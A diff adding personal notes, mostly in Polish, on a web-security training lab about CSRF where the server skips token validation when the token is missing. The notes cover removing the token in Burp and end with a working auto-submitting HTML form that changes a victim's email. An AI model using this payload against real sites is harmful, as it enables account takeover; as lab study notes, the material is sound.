@@ -1,0 +1,27 @@
+Lab: CSRF where token validation depends on token being present
+
+chodzi o to, że payload ma miec uniklny adres email i po uzyciu w exploit server, na naszej stronie zmieni sie adres
+
+atak może być przeprowadzony na każdym zalogowanym tutaj userze, ktoremu zmieniamy mail do konta
+
+1. login
+2. update email
+- burp proxy: change csrf
+- burp proxy: delete csrf
+3. Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate" > PAYLOAD ZE SWPOIM WYMYSLONYM MAILEM
+4. Paste payload to exploit server body
+5. Payload verification: view
+6. Change the email address in your exploit so that it doesn't match your own.
+7. Przed DELIVER jeszcze raz zmieniamy mail, na inny > Store the exploit, then click "Deliver to victim" to solve the lab.
+
+
+<html>
+  <body>
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="radar1@cyber.sec"/>
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+  </body>
+</html>
